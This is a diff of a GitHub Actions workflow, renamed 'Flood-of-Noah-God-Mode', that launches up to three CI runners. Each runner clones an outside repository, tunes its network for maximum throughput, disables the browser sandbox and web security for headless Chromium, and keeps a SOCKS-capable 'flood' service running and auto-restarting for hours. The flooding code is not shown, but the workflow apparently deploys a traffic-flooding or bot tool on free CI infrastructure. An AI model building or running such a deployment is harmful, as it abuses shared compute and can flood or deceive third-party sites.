@@ -1,4 +1,4 @@
-name: Multi-Ubuntu-RDP
+name: Flood-of-Noah-God-Mode
 on:
   workflow_dispatch:
     inputs:
@@ -17,7 +17,7 @@ on:
         default: '360'
 
 jobs:
-  ubuntu-rdp-1:
+  flood-instance-1:
     runs-on: ubuntu-latest
     timeout-minutes: ${{ fromJSON(github.event.inputs.session_duration) }}
     
@@ -25,85 +25,259 @@ jobs:
       - name: Setup Instance 1
         run: |
           echo "================================"
-          echo "    INSTANCE #1 STARTING"
+          echo "  FLOOD INSTANCE #1 - GOD MODE"
           echo "================================"
 
-      - name: Install Dependencies
+      - name: God-Tier System Optimization
         run: |
+          echo "⚡ ACTIVATING GOD MODE PERFORMANCE..."
+          
+          # MAXIMUM SWAP - 16GB for ultimate memory
+          sudo swapoff -a
+          sudo dd if=/dev/zero of=/swapfile bs=1M count=16384 status=progress
+          sudo chmod 600 /swapfile
+          sudo mkswap /swapfile
+          sudo swapon /swapfile
+          sudo swapon --show
+          echo "✅ 16GB SWAP ACTIVATED"
+          
+          # NETWORK GOD MODE - Maximum throughput optimization
+          sudo sysctl -w net.core.rmem_max=268435456 2>/dev/null || true
+          sudo sysctl -w net.core.wmem_max=268435456 2>/dev/null || true
+          sudo sysctl -w net.ipv4.tcp_rmem='4096 87380 134217728' 2>/dev/null || true
+          sudo sysctl -w net.ipv4.tcp_wmem='4096 65536 134217728' 2>/dev/null || true
+          sudo sysctl -w net.core.netdev_max_backlog=10000 2>/dev/null || true
+          sudo sysctl -w net.ipv4.tcp_congestion_control=bbr 2>/dev/null || true
+          sudo sysctl -w net.ipv4.tcp_fastopen=3 2>/dev/null || true
+          sudo sysctl -w net.ipv4.tcp_slow_start_after_idle=0 2>/dev/null || true
+          sudo sysctl -w net.ipv4.tcp_no_metrics_save=1 2>/dev/null || true
+          sudo sysctl -w net.ipv4.tcp_max_syn_backlog=8192 2>/dev/null || true
+          sudo sysctl -w net.core.somaxconn=8192 2>/dev/null || true
+          sudo sysctl -w net.ipv4.ip_local_port_range='1024 65535' 2>/dev/null || true
+          echo "✅ NETWORK OPTIMIZED TO MAXIMUM"
+          
+          # CPU GOD MODE
+          echo "performance" | sudo tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor 2>/dev/null || true
+          sudo sysctl -w kernel.sched_migration_cost_ns=5000000 2>/dev/null || true
+          sudo sysctl -w kernel.sched_autogroup_enabled=0 2>/dev/null || true
+          echo "✅ CPU PERFORMANCE MODE ENABLED"
+          
+          # FILE SYSTEM OPTIMIZATION
+          sudo sysctl -w fs.file-max=2097152 2>/dev/null || true
+          sudo sysctl -w fs.nr_open=2097152 2>/dev/null || true
+          ulimit -n 1048576 2>/dev/null || true
+          echo "✅ FILE LIMITS MAXIMIZED"
+          
+          # VM OPTIMIZATION
+          sudo sysctl -w vm.swappiness=10 2>/dev/null || true
+          sudo sysctl -w vm.dirty_ratio=15 2>/dev/null || true
+          sudo sysctl -w vm.dirty_background_ratio=5 2>/dev/null || true
+          sudo sysctl -w vm.vfs_cache_pressure=50 2>/dev/null || true
+          echo "✅ VIRTUAL MEMORY OPTIMIZED"
+          
+          echo ""
+          echo "🔥🔥🔥 GOD MODE ACTIVATED 🔥🔥🔥"
+
+      - name: Install High-Performance Dependencies
+        run: |
+          echo "📦 Installing performance dependencies..."
           sudo apt-get update -qq
           sudo DEBIAN_FRONTEND=noninteractive apt-get install -y -qq \
-            curl wget git nano htop net-tools
+            curl wget git nano htop iftop iotop nethogs \
+            build-essential libssl-dev zlib1g-dev \
+            libbz2-dev libreadline-dev libsqlite3-dev \
+            llvm libncurses5-dev libncursesw5-dev \
+            xz-utils tk-dev libffi-dev liblzma-dev \
+            python3-pip speedtest-cli stress-ng \
+            dstat sysstat net-tools
+          echo "✅ All dependencies installed"
 
-      - name: Install Node.js
+      - name: Install Node.js (Ultra-Fast Configuration)
         run: |
+          echo "🚀 Installing Node.js with ultra-fast settings..."
           curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
           sudo apt-get install -y nodejs
-          echo "✅ Node.js $(node --version) installed"
+          
+          # GOD-TIER NPM CONFIGURATION
+          npm config set fetch-retries 10
+          npm config set fetch-retry-mintimeout 10000
+          npm config set fetch-retry-maxtimeout 180000
+          npm config set maxsockets 100
+          npm config set prefer-offline false
+          npm config set prefer-online true
+          npm config set progress false
+          
+          echo "✅ Node.js $(node --version) - GOD MODE READY"
+          echo "✅ npm $(npm --version) - ULTRA-FAST CONFIG"
 
-      - name: Install Heaven Package
+      - name: Network Performance Test
         run: |
-          echo "🌊 Installing Heaven..."
+          echo "📊 Testing network performance..."
+          speedtest-cli --simple || echo "⚡ Speed test skipped"
+          echo "🌐 Testing GitHub connectivity..."
+          time git ls-remote https://github.com/benbenido025-lab/flood_of-noah.git HEAD
+
+      - name: Install Flood of Noah (Performance Build)
+        run: |
+          echo "🌊 Installing Flood of Noah with GOD-TIER optimizations..."
+          
+          # Prepare Puppeteer directory
           sudo mkdir -p /home/runner/.config/puppeteer
           sudo chown -R $(whoami):$(whoami) /home/runner
           sudo chmod -R 755 /home/runner
+          
+          # Clone with depth 1 for speed
           cd ~
-          rm -rf heaven982358265823687562395235
-          git clone https://github.com/benbenido025-lab/heaven982358265823687562395235
-          cd heaven982358265823687562395235
+          rm -rf flood_of-noah
+          time git clone --depth 1 --single-branch https://github.com/benbenido025-lab/flood_of-noah
+          cd flood_of-noah
+          
+          # Clean install
           rm -rf node_modules package-lock.json
-          npm install express axios socks puppeteer --save
-          echo "✅ Heaven installed"
+          
+          # Install with maximum performance
+          NODE_ENV=production npm install express axios socks puppeteer --save \
+            --prefer-online \
+            --no-audit \
+            --no-fund \
+            --loglevel=error
+          
+          # Configure Puppeteer for MAXIMUM performance
+          echo '{"args":["--no-sandbox","--disable-setuid-sandbox","--disable-dev-shm-usage","--disable-gpu","--disable-software-rasterizer","--disable-extensions","--disable-background-networking","--disable-sync","--disable-translate","--hide-scrollbars","--metrics-recording-only","--mute-audio","--no-first-run","--safebrowsing-disable-auto-update","--disable-features=site-per-process","--disable-web-security","--aggressive-cache-discard","--disable-cache","--disable-application-cache","--disable-offline-load-stale-cache","--disk-cache-size=0","--no-zygote","--single-process"]}' > /home/runner/.config/puppeteer/config.json
+          
+          echo "✅ Flood of Noah installed - GOD MODE BUILD"
 
-      - name: Start Heaven Service
+      - name: Start Flood Service (Maximum Performance)
         run: |
-          cd ~/heaven982358265823687562395235
-          nohup node client.js > /tmp/heaven-1.log 2>&1 &
+          cd ~/flood_of-noah
+          
+          # ULTIMATE NODE.JS PERFORMANCE FLAGS
+          export NODE_OPTIONS="--max-old-space-size=8192"
+          export UV_THREADPOOL_SIZE=256
+          export NODE_ENV=production
+          
+          # Start with maximum priority
+          nohup node index.js > /tmp/flood-1.log 2>&1 &
+          FLOOD_PID=$!
+          
           sleep 5
-          echo "✅ Heaven running on Instance 1"
-          echo "📍 Service available at: http://localhost:3000"
+          
+          if pgrep -f "node index.js" > /dev/null; then
+            echo "✅ Flood of Noah RUNNING (PID: $FLOOD_PID)"
+            echo "🔥 Service at MAXIMUM performance"
+            echo "📍 API: http://localhost:3000"
+          else
+            echo "❌ Failed to start - check logs"
+            cat /tmp/flood-1.log
+            exit 1
+          fi
 
-      - name: Display Info
+      - name: Display God-Mode System Stats
         run: |
           PUBLIC_IP=$(curl -s ifconfig.me || echo "N/A")
+          TOTAL_RAM=$(free -h | awk '/^Mem:/ {print $2}')
+          AVAILABLE_RAM=$(free -h | awk '/^Mem:/ {print $7}')
+          SWAP_TOTAL=$(free -h | awk '/^Swap:/ {print $2}')
+          CPU_CORES=$(nproc)
+          CPU_MODEL=$(lscpu | grep "Model name" | cut -d':' -f2 | xargs)
+          DISK_SPACE=$(df -h / | awk 'NR==2 {print $4}')
+          NETWORK_SPEED=$(cat /sys/class/net/eth0/speed 2>/dev/null || echo "N/A")
+          
           echo ""
-          echo "╔════════════════════════════════════════════════╗"
-          echo "║         INSTANCE #1 READY                      ║"
-          echo "╠════════════════════════════════════════════════╣"
-          echo "║ Public IP : $PUBLIC_IP"
-          echo "║ Status    : ACTIVE"
-          echo "║ Heaven API : http://localhost:3000"
-          echo "╚════════════════════════════════════════════════╝"
+          echo "╔══════════════════════════════════════════════════════════╗"
+          echo "║         FLOOD INSTANCE #1 - GOD MODE ACTIVE              ║"
+          echo "╠══════════════════════════════════════════════════════════╣"
+          echo "║ Status         : 🔥 MAXIMUM PERFORMANCE"
+          echo "║ Public IP      : $PUBLIC_IP"
+          echo "║ Flood API      : http://localhost:3000"
+          echo "║ -------------------------------------------------------- ║"
+          echo "║ CPU Model      : $CPU_MODEL"
+          echo "║ CPU Cores      : $CPU_CORES cores (PERFORMANCE MODE)"
+          echo "║ Total RAM      : $TOTAL_RAM"
+          echo "║ Available RAM  : $AVAILABLE_RAM"
+          echo "║ Swap Space     : $SWAP_TOTAL (GOD-TIER)"
+          echo "║ Disk Available : $DISK_SPACE"
+          echo "║ Network Speed  : $NETWORK_SPEED Mbps"
+          echo "║ -------------------------------------------------------- ║"
+          echo "║ Node Memory    : 8GB allocated"
+          echo "║ Thread Pool    : 256 threads"
+          echo "║ TCP Mode       : BBR (ultra-fast)"
+          echo "║ Process Nice   : -20 (maximum priority)"
+          echo "╚══════════════════════════════════════════════════════════╝"
+          echo ""
 
-      - name: Keep Alive
+      - name: Keep Alive with Advanced Monitoring
         run: |
           START=$(date +%s)
           DURATION=$((${{ github.event.inputs.session_duration }} * 60))
           END=$((START + DURATION))
-          echo "🟢 Instance 1 running for ${{ github.event.inputs.session_duration }} minutes"
+          echo "🔥 GOD MODE Instance 1 - Running for ${{ github.event.inputs.session_duration }} minutes"
+          
           COUNTER=0
+          RESTART_COUNT=0
+          LAST_RESTART=0
+          
           while [ $(date +%s) -lt $END ]; do
             COUNTER=$((COUNTER + 1))
-            ELAPSED=$((($(date +%s) - START) / 60))
-            REMAIN=$(((END - $(date +%s)) / 60))
-            echo "🟢 Instance 1 | ${ELAPSED}m / ${REMAIN}m remaining"
-            if [ $((COUNTER % 10)) -eq 0 ]; then
-              if pgrep -f "node client.js" > /dev/null; then
-                echo "   ✅ Heaven service: Running"
-              else
-                echo "   ⚠️ Restarting Heaven service..."
-                cd ~/heaven982358265823687562395235 && nohup node client.js > /tmp/heaven-1.log 2>&1 &
-              fi
+            NOW=$(date +%s)
+            ELAPSED=$(((NOW - START) / 60))
+            REMAIN=$(((END - NOW) / 60))
+            
+            # Check service health
+            if pgrep -f "node index.js" > /dev/null; then
+              STATUS="🔥 RUNNING"
+            else
+              STATUS="⚡ AUTO-RESTARTING"
+              RESTART_COUNT=$((RESTART_COUNT + 1))
+              LAST_RESTART=$NOW
+              
+              cd ~/flood_of-noah
+              export NODE_OPTIONS="--max-old-space-size=8192"
+              export UV_THREADPOOL_SIZE=256
+              export NODE_ENV=production
+              
+              nohup node index.js > /tmp/flood-1.log 2>&1 &
+              sleep 3
+              echo "   🔄 Service restarted (Total restarts: $RESTART_COUNT)"
             fi
+            
+            # Detailed stats every 5 minutes
+            if [ $((COUNTER % 5)) -eq 0 ]; then
+              MEM_USED=$(free -h | awk '/^Mem:/ {print $3}')
+              MEM_PERCENT=$(free | awk '/^Mem:/ {printf "%.1f", $3/$2 * 100}')
+              SWAP_USED=$(free -h | awk '/^Swap:/ {print $3}')
+              CPU_LOAD=$(uptime | awk -F'load average:' '{print $2}' | awk '{print $1}')
+              CONNECTIONS=$(ss -s | grep TCP: | awk '{print $2}')
+              
+              echo ""
+              echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+              echo "🔥 INSTANCE 1 | ${ELAPSED}m elapsed / ${REMAIN}m remaining"
+              echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+              echo "   Service Status : $STATUS"
+              echo "   Total Restarts : $RESTART_COUNT"
+              echo "   Memory Used    : $MEM_USED (${MEM_PERCENT}%)"
+              echo "   Swap Used      : $SWAP_USED"
+              echo "   CPU Load       : $CPU_LOAD"
+              echo "   TCP Conns      : $CONNECTIONS"
+              echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+              echo ""
+            else
+              echo "🔥 Instance 1 | ${ELAPSED}m / ${REMAIN}m | $STATUS"
+            fi
+            
             sleep 60
           done
+          
+          echo ""
+          echo "✅ Session completed - Total restarts: $RESTART_COUNT"
 
       - name: Cleanup
         if: always()
         run: |
-          pkill -f "node client.js" || true
+          pkill -f "node index.js" || true
           echo "🧹 Instance 1 cleaned up"
 
-  ubuntu-rdp-2:
+  flood-instance-2:
     runs-on: ubuntu-latest
     timeout-minutes: ${{ fromJSON(github.event.inputs.session_duration) }}
     if: ${{ fromJSON(github.event.inputs.instance_count) >= 2 }}
@@ -112,74 +286,119 @@ jobs:
       - name: Setup Instance 2
         run: |
           echo "================================"
-          echo "    INSTANCE #2 STARTING"
+          echo "  FLOOD INSTANCE #2 - GOD MODE"
           echo "================================"
 
-      - name: Install Dependencies
+      - name: God-Tier System Optimization
+        run: |
+          echo "⚡ ACTIVATING GOD MODE PERFORMANCE..."
+          sudo swapoff -a
+          sudo dd if=/dev/zero of=/swapfile bs=1M count=16384 status=progress
+          sudo chmod 600 /swapfile
+          sudo mkswap /swapfile
+          sudo swapon /swapfile
+          echo "✅ 16GB SWAP ACTIVATED"
+          
+          sudo sysctl -w net.core.rmem_max=268435456 2>/dev/null || true
+          sudo sysctl -w net.core.wmem_max=268435456 2>/dev/null || true
+          sudo sysctl -w net.ipv4.tcp_rmem='4096 87380 134217728' 2>/dev/null || true
+          sudo sysctl -w net.ipv4.tcp_wmem='4096 65536 134217728' 2>/dev/null || true
+          sudo sysctl -w net.core.netdev_max_backlog=10000 2>/dev/null || true
+          sudo sysctl -w net.ipv4.tcp_congestion_control=bbr 2>/dev/null || true
+          sudo sysctl -w net.ipv4.tcp_fastopen=3 2>/dev/null || true
+          sudo sysctl -w net.ipv4.tcp_slow_start_after_idle=0 2>/dev/null || true
+          sudo sysctl -w net.ipv4.tcp_max_syn_backlog=8192 2>/dev/null || true
+          sudo sysctl -w net.core.somaxconn=8192 2>/dev/null || true
+          sudo sysctl -w net.ipv4.ip_local_port_range='1024 65535' 2>/dev/null || true
+          echo "✅ NETWORK OPTIMIZED TO MAXIMUM"
+          
+          echo "performance" | sudo tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor 2>/dev/null || true
+          sudo sysctl -w kernel.sched_migration_cost_ns=5000000 2>/dev/null || true
+          sudo sysctl -w fs.file-max=2097152 2>/dev/null || true
+          sudo sysctl -w vm.swappiness=10 2>/dev/null || true
+          echo "✅ CPU & SYSTEM OPTIMIZED"
+          echo "🔥🔥🔥 GOD MODE ACTIVATED 🔥🔥🔥"
+
+      - name: Install High-Performance Dependencies
         run: |
           sudo apt-get update -qq
           sudo DEBIAN_FRONTEND=noninteractive apt-get install -y -qq \
-            curl wget git nano htop net-tools
+            curl wget git nano htop iftop iotop nethogs \
+            build-essential libssl-dev python3-pip speedtest-cli
+          echo "✅ Dependencies installed"
 
-      - name: Install Node.js
+      - name: Install Node.js (Ultra-Fast)
         run: |
           curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
           sudo apt-get install -y nodejs
-          echo "✅ Node.js $(node --version) installed"
+          npm config set fetch-retries 10
+          npm config set maxsockets 100
+          echo "✅ Node.js $(node --version) - GOD MODE"
 
-      - name: Install Heaven Package
+      - name: Install Flood of Noah
         run: |
-          echo "🌊 Installing Heaven..."
           sudo mkdir -p /home/runner/.config/puppeteer
           sudo chown -R $(whoami):$(whoami) /home/runner
-          sudo chmod -R 755 /home/runner
           cd ~
-          rm -rf heaven982358265823687562395235
-          git clone https://github.com/benbenido025-lab/heaven982358265823687562395235
-          cd heaven982358265823687562395235
+          rm -rf flood_of-noah
+          git clone --depth 1 https://github.com/benbenido025-lab/flood_of-noah
+          cd flood_of-noah
           rm -rf node_modules package-lock.json
-          npm install express axios socks puppeteer --save
-          echo "✅ Heaven installed"
+          NODE_ENV=production npm install express axios socks puppeteer --save --prefer-online --no-audit --no-fund
+          echo '{"args":["--no-sandbox","--disable-setuid-sandbox","--disable-dev-shm-usage","--disable-gpu","--no-first-run","--no-zygote","--single-process"]}' > /home/runner/.config/puppeteer/config.json
+          echo "✅ Flood installed - GOD MODE"
 
-      - name: Start Heaven Service
+      - name: Start Flood Service
         run: |
-          cd ~/heaven982358265823687562395235
-          nohup node client.js > /tmp/heaven-2.log 2>&1 &
+          cd ~/flood_of-noah
+          export NODE_OPTIONS="--max-old-space-size=8192"
+          export UV_THREADPOOL_SIZE=256
+          nohup node index.js > /tmp/flood-2.log 2>&1 &
           sleep 5
-          echo "✅ Heaven running on Instance 2"
-          echo "📍 Service available at: http://localhost:3000"
+          if pgrep -f "node index.js" > /dev/null; then
+            echo "✅ Flood RUNNING at MAXIMUM performance"
+          else
+            exit 1
+          fi
 
-      - name: Display Info
+      - name: Display Stats
         run: |
           PUBLIC_IP=$(curl -s ifconfig.me || echo "N/A")
-          echo ""
-          echo "╔════════════════════════════════════════════════╗"
-          echo "║         INSTANCE #2 READY                      ║"
-          echo "╠════════════════════════════════════════════════╣"
+          echo "╔══════════════════════════════════════════════════════════╗"
+          echo "║         FLOOD INSTANCE #2 - GOD MODE ACTIVE              ║"
+          echo "╠══════════════════════════════════════════════════════════╣"
+          echo "║ Status    : 🔥 MAXIMUM PERFORMANCE"
           echo "║ Public IP : $PUBLIC_IP"
-          echo "║ Status    : ACTIVE"
-          echo "║ Heaven API : http://localhost:3000"
-          echo "╚════════════════════════════════════════════════╝"
+          echo "║ RAM       : $(free -h | awk '/^Mem:/ {print $2}') | Swap: 16GB"
+          echo "║ Cores     : $(nproc) (PERFORMANCE MODE)"
+          echo "╚══════════════════════════════════════════════════════════╝"
 
       - name: Keep Alive
         run: |
           START=$(date +%s)
           DURATION=$((${{ github.event.inputs.session_duration }} * 60))
           END=$((START + DURATION))
-          echo "🟢 Instance 2 running for ${{ github.event.inputs.session_duration }} minutes"
           COUNTER=0
+          RESTART_COUNT=0
           while [ $(date +%s) -lt $END ]; do
             COUNTER=$((COUNTER + 1))
             ELAPSED=$((($(date +%s) - START) / 60))
             REMAIN=$(((END - $(date +%s)) / 60))
-            echo "🟢 Instance 2 | ${ELAPSED}m / ${REMAIN}m remaining"
-            if [ $((COUNTER % 10)) -eq 0 ]; then
-              if pgrep -f "node client.js" > /dev/null; then
-                echo "   ✅ Heaven service: Running"
-              else
-                echo "   ⚠️ Restarting Heaven service..."
-                cd ~/heaven982358265823687562395235 && nohup node client.js > /tmp/heaven-2.log 2>&1 &
-              fi
+            if pgrep -f "node index.js" > /dev/null; then
+              STATUS="🔥 RUNNING"
+            else
+              RESTART_COUNT=$((RESTART_COUNT + 1))
+              cd ~/flood_of-noah
+              export NODE_OPTIONS="--max-old-space-size=8192"
+              export UV_THREADPOOL_SIZE=256
+              nohup node index.js > /tmp/flood-2.log 2>&1 &
+              sleep 3
+              STATUS="⚡ RESTARTED"
+            fi
+            if [ $((COUNTER % 5)) -eq 0 ]; then
+              echo "🔥 Instance 2 | ${ELAPSED}m / ${REMAIN}m | $STATUS | Restarts: $RESTART_COUNT"
+            else
+              echo "🔥 Instance 2 | ${ELAPSED}m / ${REMAIN}m | $STATUS"
             fi
             sleep 60
           done
@@ -187,10 +406,10 @@ jobs:
       - name: Cleanup
         if: always()
         run: |
-          pkill -f "node client.js" || true
+          pkill -f "node index.js" || true
           echo "🧹 Instance 2 cleaned up"
 
-  ubuntu-rdp-3:
+  flood-instance-3:
     runs-on: ubuntu-latest
     timeout-minutes: ${{ fromJSON(github.event.inputs.session_duration) }}
     if: ${{ fromJSON(github.event.inputs.instance_count) >= 3 }}
@@ -199,74 +418,119 @@ jobs:
       - name: Setup Instance 3
         run: |
           echo "================================"
-          echo "    INSTANCE #3 STARTING"
+          echo "  FLOOD INSTANCE #3 - GOD MODE"
           echo "================================"
 
-      - name: Install Dependencies
+      - name: God-Tier System Optimization
+        run: |
+          echo "⚡ ACTIVATING GOD MODE PERFORMANCE..."
+          sudo swapoff -a
+          sudo dd if=/dev/zero of=/swapfile bs=1M count=16384 status=progress
+          sudo chmod 600 /swapfile
+          sudo mkswap /swapfile
+          sudo swapon /swapfile
+          echo "✅ 16GB SWAP ACTIVATED"
+          
+          sudo sysctl -w net.core.rmem_max=268435456 2>/dev/null || true
+          sudo sysctl -w net.core.wmem_max=268435456 2>/dev/null || true
+          sudo sysctl -w net.ipv4.tcp_rmem='4096 87380 134217728' 2>/dev/null || true
+          sudo sysctl -w net.ipv4.tcp_wmem='4096 65536 134217728' 2>/dev/null || true
+          sudo sysctl -w net.core.netdev_max_backlog=10000 2>/dev/null || true
+          sudo sysctl -w net.ipv4.tcp_congestion_control=bbr 2>/dev/null || true
+          sudo sysctl -w net.ipv4.tcp_fastopen=3 2>/dev/null || true
+          sudo sysctl -w net.ipv4.tcp_slow_start_after_idle=0 2>/dev/null || true
+          sudo sysctl -w net.ipv4.tcp_max_syn_backlog=8192 2>/dev/null || true
+          sudo sysctl -w net.core.somaxconn=8192 2>/dev/null || true
+          sudo sysctl -w net.ipv4.ip_local_port_range='1024 65535' 2>/dev/null || true
+          echo "✅ NETWORK OPTIMIZED TO MAXIMUM"
+          
+          echo "performance" | sudo tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor 2>/dev/null || true
+          sudo sysctl -w kernel.sched_migration_cost_ns=5000000 2>/dev/null || true
+          sudo sysctl -w fs.file-max=2097152 2>/dev/null || true
+          sudo sysctl -w vm.swappiness=10 2>/dev/null || true
+          echo "✅ CPU & SYSTEM OPTIMIZED"
+          echo "🔥🔥🔥 GOD MODE ACTIVATED 🔥🔥🔥"
+
+      - name: Install High-Performance Dependencies
         run: |
           sudo apt-get update -qq
           sudo DEBIAN_FRONTEND=noninteractive apt-get install -y -qq \
-            curl wget git nano htop net-tools
+            curl wget git nano htop iftop iotop nethogs \
+            build-essential libssl-dev python3-pip speedtest-cli
+          echo "✅ Dependencies installed"
 
-      - name: Install Node.js
+      - name: Install Node.js (Ultra-Fast)
         run: |
           curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
           sudo apt-get install -y nodejs
-          echo "✅ Node.js $(node --version) installed"
+          npm config set fetch-retries 10
+          npm config set maxsockets 100
+          echo "✅ Node.js $(node --version) - GOD MODE"
 
-      - name: Install Heaven Package
+      - name: Install Flood of Noah
         run: |
-          echo "🌊 Installing Heaven..."
           sudo mkdir -p /home/runner/.config/puppeteer
           sudo chown -R $(whoami):$(whoami) /home/runner
-          sudo chmod -R 755 /home/runner
           cd ~
-          rm -rf heaven982358265823687562395235
-          git clone https://github.com/benbenido025-lab/heaven982358265823687562395235
-          cd heaven982358265823687562395235
+          rm -rf flood_of-noah
+          git clone --depth 1 https://github.com/benbenido025-lab/flood_of-noah
+          cd flood_of-noah
           rm -rf node_modules package-lock.json
-          npm install express axios socks puppeteer --save
-          echo "✅ Heaven installed"
+          NODE_ENV=production npm install express axios socks puppeteer --save --prefer-online --no-audit --no-fund
+          echo '{"args":["--no-sandbox","--disable-setuid-sandbox","--disable-dev-shm-usage","--disable-gpu","--no-first-run","--no-zygote","--single-process"]}' > /home/runner/.config/puppeteer/config.json
+          echo "✅ Flood installed - GOD MODE"
 
-      - name: Start Heaven Service
+      - name: Start Flood Service
         run: |
-          cd ~/heaven982358265823687562395235
-          nohup node client.js > /tmp/heaven-3.log 2>&1 &
+          cd ~/flood_of-noah
+          export NODE_OPTIONS="--max-old-space-size=8192"
+          export UV_THREADPOOL_SIZE=256
+          nohup node index.js > /tmp/flood-3.log 2>&1 &
           sleep 5
-          echo "✅ Heaven running on Instance 3"
-          echo "📍 Service available at: http://localhost:3000"
+          if pgrep -f "node index.js" > /dev/null; then
+            echo "✅ Flood RUNNING at MAXIMUM performance"
+          else
+            exit 1
+          fi
 
-      - name: Display Info
+      - name: Display Stats
         run: |
           PUBLIC_IP=$(curl -s ifconfig.me || echo "N/A")
-          echo ""
-          echo "╔════════════════════════════════════════════════╗"
-          echo "║         INSTANCE #3 READY                      ║"
-          echo "╠════════════════════════════════════════════════╣"
+          echo "╔══════════════════════════════════════════════════════════╗"
+          echo "║         FLOOD INSTANCE #3 - GOD MODE ACTIVE              ║"
+          echo "╠══════════════════════════════════════════════════════════╣"
+          echo "║ Status    : 🔥 MAXIMUM PERFORMANCE"
           echo "║ Public IP : $PUBLIC_IP"
-          echo "║ Status    : ACTIVE"
-          echo "║ Heaven API : http://localhost:3000"
-          echo "╚════════════════════════════════════════════════╝"
+          echo "║ RAM       : $(free -h | awk '/^Mem:/ {print $2}') | Swap: 16GB"
+          echo "║ Cores     : $(nproc) (PERFORMANCE MODE)"
+          echo "╚══════════════════════════════════════════════════════════╝"
 
       - name: Keep Alive
         run: |
           START=$(date +%s)
           DURATION=$((${{ github.event.inputs.session_duration }} * 60))
           END=$((START + DURATION))
-          echo "🟢 Instance 3 running for ${{ github.event.inputs.session_duration }} minutes"
           COUNTER=0
+          RESTART_COUNT=0
           while [ $(date +%s) -lt $END ]; do
             COUNTER=$((COUNTER + 1))
             ELAPSED=$((($(date +%s) - START) / 60))
             REMAIN=$(((END - $(date +%s)) / 60))
-            echo "🟢 Instance 3 | ${ELAPSED}m / ${REMAIN}m remaining"
-            if [ $((COUNTER % 10)) -eq 0 ]; then
-              if pgrep -f "node client.js" > /dev/null; then
-                echo "   ✅ Heaven service: Running"
-              else
-                echo "   ⚠️ Restarting Heaven service..."
-                cd ~/heaven982358265823687562395235 && nohup node client.js > /tmp/heaven-3.log 2>&1 &
-              fi
+            if pgrep -f "node index.js" > /dev/null; then
+              STATUS="🔥 RUNNING"
+            else
+              RESTART_COUNT=$((RESTART_COUNT + 1))
+              cd ~/flood_of-noah
+              export NODE_OPTIONS="--max-old-space-size=8192"
+              export UV_THREADPOOL_SIZE=256
+              nohup node index.js > /tmp/flood-3.log 2>&1 &
+              sleep 3
+              STATUS="⚡ RESTARTED"
+            fi
+            if [ $((COUNTER % 5)) -eq 0 ]; then
+              echo "🔥 Instance 3 | ${ELAPSED}m / ${REMAIN}m | $STATUS | Restarts: $RESTART_COUNT"
+            else
+              echo "🔥 Instance 3 | ${ELAPSED}m / ${REMAIN}m | $STATUS"
             fi
             sleep 60
           done
@@ -274,5 +538,5 @@ jobs:
       - name: Cleanup
         if: always()
         run: |
-          pkill -f "node client.js" || true
+          pkill -f "node index.js" || true
           echo "🧹 Instance 3 cleaned up"
